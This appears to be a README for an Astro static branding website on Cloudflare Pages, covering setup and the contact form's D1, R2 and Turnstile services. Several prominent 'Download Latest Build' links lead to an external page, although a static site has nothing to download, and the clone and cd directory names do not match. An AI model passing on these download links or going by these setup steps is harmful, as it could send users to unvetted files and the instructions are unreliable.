# Apex Branding & Design vUnversioned - Static Website 2026

> **Apex Branding & Design is an Astro-powered branding site that serves pre-rendered content through Cloudflare Pages, alongside a contact workflow built with Cloudflare services.**

[![Platform](https://img.shields.io/badge/Platform-Astro%20on%20Cloudflare%20Pages-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unversioned-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/scottnathanbvd1897/apex-branding-design-pages?style=flat-square)](https://github.com/scottnathanbvd1897/apex-branding-design-pages)

---

<p align="center">
  <a href="https://scottnathanbvd1897.github.io/apex-branding-design-pages/">
    <img src="https://img.shields.io/badge/Download-Apex%20Branding%20%26%20Design%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Branding & Design">
  </a>
</p>

> **[Download Apex Branding & Design](https://scottnathanbvd1897.github.io/apex-branding-design-pages/)**

---

[Download Latest Build](https://scottnathanbvd1897.github.io/apex-branding-design-pages/)

---

## Project Overview

Apex Branding & Design is a static Astro website designed to showcase branding and design work using fast, pre-generated pages. The site is prepared for deployment with Cloudflare Pages, offering organizations a focused online presence delivered through a managed hosting platform.

Its contact system is supported by Cloudflare services. Contact submissions may be saved in D1, image files may be served from R2, and Turnstile, honeypot inputs, and per-IP request limits help control automated and excessive form traffic.

---

## Included Capabilities

- Astro-generated static HTML pages
- Cloudflare Pages deployment support
- D1 integration for contact form submissions
- Image hosting through R2
- Turnstile protection for the contact form
- Honeypot checks to help identify automated entries
- Rate limiting based on client IP
- Cloudflare Functions for server-side contact processing

---

## Getting Started

First, clone the repository and install the dependencies:

```bash
git clone https://github.com/scottnathanbvd1897/apex-branding-design-pages.git
cd apex-branding-design-astro
npm install
```

Launch the development environment with:

```bash
npm run dev
```

To produce the static output intended for deployment, use:

```bash
npm run build
```

Once generated, the site can be linked to a Cloudflare Pages project using the deployment settings defined for the project.

---

## Development and Deployment

Use the following sequence for a standard local-to-production workflow:

1. Check out the repository.
2. Install dependencies with `npm install`.
3. Use `npm run dev` to work on pages and styling locally.
4. Set up the Cloudflare bindings required by the contact form.
5. Generate the production output with `npm run build`.
6. Publish the generated site through Cloudflare Pages.

Cloudflare Functions handle the server-side contact process and use D1 for storing submitted form data. R2 is available for image assets, while Turnstile and the other request checks participate in the form validation and protection flow.

---

## Cloudflare Service Setup

Service bindings belong in the deployment configuration and should not be embedded directly in the site source. This project uses the following Cloudflare components:

```text
Cloudflare Pages       Static site deployment
Cloudflare Functions   Contact form processing
D1                     Contact submission storage
R2                     Image hosting
Turnstile               Form verification
```

Store environment-specific values and identifiers in the local configuration or Cloudflare Pages settings used by the project. Before releasing a build with the contact form enabled, inspect the deployment configuration and confirm that the required services are connected.

---

## Prerequisites

- Node.js and npm for development and static builds
- Astro tooling supplied through the repository dependencies
- A Cloudflare Pages project for deployment
- Cloudflare Functions for processing contact requests
- A D1 database if contact submissions are enabled
- An R2 bucket if image storage is enabled
- Turnstile settings for form verification

---

## Frequently Asked Questions

### Does this project have a release version?

The current project metadata does not specify a release number, so the project is marked as unversioned.

### How can I run the website locally?

Install the dependencies, then execute:

```bash
npm run dev
```

This starts Astro's local development process so the site can be reviewed while changes are made.

### How do I generate the production site?

Run `npm run build`. Astro will create the static output that can be deployed through Cloudflare Pages.

### Which services does the contact form need?

The contact workflow depends on Cloudflare Functions and D1. Its configuration also includes Turnstile, honeypot checks, and per-IP rate limiting.

### Where should the website images live?

R2 is the project's intended image-hosting service. Set up its connection through the Cloudflare deployment environment.

### What can cause contact submissions to fail?

Check that Cloudflare Functions is deployed correctly and that the D1 binding, Turnstile settings, and request-limiting configuration are valid. The deployed environment should also contain all expected service values.

### How do I publish changes?

Update the repository, create a fresh production build, and deploy that build through Cloudflare Pages.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
